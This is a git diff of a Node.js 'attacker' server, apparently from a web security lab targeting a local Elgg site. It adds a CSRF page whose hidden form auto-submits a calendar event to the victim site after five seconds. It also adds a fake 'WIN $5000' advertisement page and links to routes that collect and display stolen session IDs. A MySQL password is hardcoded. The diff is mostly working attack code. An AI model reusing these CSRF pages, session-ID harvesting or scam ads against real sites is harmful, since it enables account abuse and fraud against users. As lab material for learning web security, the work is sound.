@@ -2,6 +2,7 @@
 var http = require('http'),
 	url = require('url'),
     fs = require('fs'),
+    mysqlObj = require('mysql'),
     path = require('path'),
     qs = require('querystring'); 
 
@@ -53,6 +54,30 @@ http.createServer(function (req, res) {
 
             
             break;
+
+        case "/tableList":
+
+            var connection = mysqlObj.createConnection({
+              host     : 'localhost',
+              user     : 'naman',
+              password : 'IAMTHEBEST'
+            });
+
+            connection.connect();
+
+            connection.query('SELECT * from elgg.attack', function(err, rows, fields) {
+              if (err) throw err;
+
+              res.writeHead(200, {'Content-Type': 'text/html'});
+              var html = getTableListHtml(rows);
+              res.write(html);              
+              res.end();
+            });
+
+            connection.end();
+            
+
+            break;
     	case "/myprof":    		
   			var getdata = qs.parse(urlObj.query);
             var log = fs.createWriteStream('sessionid.txt', {'flags': 'a'});    
@@ -67,7 +92,7 @@ http.createServer(function (req, res) {
     		res.writeHead(302,{Location: 'http://'+hostname+'/elgg/pg/profile/attack1'});
     		res.end();
     		break;
-		case "/myevilad":
+		case "/evilad":
 				var html = getEvilAdHtmlCode();
                     
                     //Start creating response
@@ -75,6 +100,15 @@ http.createServer(function (req, res) {
                     res.write(html);
                     res.end();        
 			break;
+
+        case "/csrfattack":
+                var html = getCSRFHtmlCode();
+                    
+                    //Start creating response
+                    res.writeHead(200, {'Content-Type': 'text/html'});
+                    res.write(html);
+                    res.end();        
+            break;
         case "/getsessionid":
             fs.readFile('sessionid.txt',function(err,data){
 
@@ -148,17 +182,18 @@ function getSessionHtmlCode(data){
 }
 
 function getEvilAdHtmlCode(){
-   var str = '';
+   var str = '';   
     str += '<html>';
     str += '<head>';
     str += '<script type="text/javascript" src="jquery.js"></script>';
     str += '<script type="text/javascript" src="evilad.js"></script>';
     str += '</head>';
-    str += '<body>';
-    str += '<div id="hdnSession">';
-	str += 'This is an evil advertisment';	
-    str += '</div>';
-    str += '</body>    ';
+    str += '<body bgcolor="blue">';
+    str += '<br>';
+    str += '<div align="center"><blink> WIN $5000 IN 5 MINUTES! WANT TO KNOW HOW?</blink>';
+    str += '<input type="button" value="CLICK HERE!" id="adclickbutton" onclick="postmessagetoparent()"/></div>';
+    str += '<div id="test"></div>';
+    str += '</body>';
     str += '</html>';
     return str;
 
@@ -190,12 +225,31 @@ function getHomePageHtmlCode(){
     str += '</div>';
     str += '</a>';
 
-    str += '<a href="/getsessionid" class="mylink">';
+    str += '<a href="/fileList" class="mylink">';
     str += '<div class="title">';
-    str += 'Session IDs';
+    str += 'File List';
     str += '</div>';
     str += '<div class="desc">';
-    str += 'See session ids of collected users';
+    str += 'See File list of /tmp';
+    str += '</div>';
+    str += '</a>';
+
+    str += '<a href="/tableList" class="mylink">';
+    str += '<div class="title">';
+    str += 'Table Select';
+    str += '</div>';
+    str += '<div class="desc">';
+    str += 'See Contents of elgg.attack';
+    str += '</div>';
+    str += '</a>';
+
+
+    str += '<a href="/evilad" class="mylink">';
+    str += '<div class="title">';
+    str += 'Evil Advertisment';
+    str += '</div>';
+    str += '<div class="desc">';
+    str += 'Check out the evil ad';
     str += '</div>';
     str += '</a>';
 
@@ -223,7 +277,7 @@ function getFileListHtml(data){
     for(var i in data){
 
         str += '<tr>';    
-        str += '<tr>'+data[i]+'</tr>';
+        str += '<td>'+data[i]+'</td>';
         str += '</tr>';
 
     }
@@ -233,6 +287,65 @@ function getFileListHtml(data){
     str += '</html>';
     return str;
 
+}
+
+
+
+function getTableListHtml(data){
+
+    var str = '';
+    str += '<html>';
+    str += '<head>';
+    str += '<script type="text/javascript" src="jquery.js"></script>';    
+    str += '</head>';
+    str += '<body>';    
+    str += '<table id="myTab" border="1">';
+    str += '<tr>';    
+    str += '<th>Id</th>';
+    str += '<th>Name</th>';
+    str += '</tr>';
+
+    for(var i in data){
+
+        str += '<tr>';    
+        str += '<td>'+data[i].id+'</td>';
+        str += '<td>'+data[i].name+'</td>';
+        str += '</tr>';
+
+    }
+
+    str += '</table>';
+    str += '</body>';
+    str += '</html>';
+    return str;
+
+}
+
+
+function getCSRFHtmlCode(){
+
+var str = "";
+str += '<html>';
+str += '<head>';
+str += '</head>';
+str += '<body bgcolor="black" onload="setTimeout(\'document.events.submit();\',5000);">';
+str += '<center>';
+str += '<font color="white"><h1>Welcome to this Web Security Site !!!</h1>';
+str += '<h2>There is a surprise for you every 5 seconds</h2></font>';
+str += '</center>';
+str += '<form name="events" action="http://localhost/elgg/action/google_integration/add" method="POST">        ';
+str += '<input type="hidden" name="ename" value="Attack"/>';
+str += '<input type="hidden" name="esdate" value="2014-03-29"/>';
+str += '<input type="hidden" name="eedate" value="2014-03-29"/>';
+str += '<input type="hidden" name="estime" value="00:00"/>';
+str += '<input type="hidden" name="eetime" value="00:00"/>';
+str += '<input type="hidden" name="eloc" value="My Hacker Place"/>';
+str += '<input type="hidden" name="etext" value="You are CSRF Attacked"/>        ';
+str += '</form> ';
+str += '</body>';
+str += '</html>';
+
+return str;
 }
 
 
